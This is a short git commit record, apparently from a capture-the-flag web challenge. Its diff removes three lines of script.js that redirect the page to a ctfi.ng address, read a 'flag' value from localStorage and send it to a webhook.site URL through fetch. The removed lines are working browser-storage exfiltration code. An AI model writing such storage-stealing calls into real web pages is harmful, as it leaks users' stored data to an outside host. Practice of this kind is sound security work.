2f0b340e3c576767e242a6b3af81511bb2c1405c
MinNguRoi <lengocbaominh161@gmail.com>
2025-09-21 13:24:44 +0700

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,1 @@
-setTimeout(() => {document.location.href = "https://safe-url.ctfi.ng"},1000)
-var flag = localStorage.getItem("flag");
-fetch("https://webhook.site/2f16d9d2-d7dc-41ed-b791-41ba3e4de387?flag=" + encodeURIComponent(flag));
+
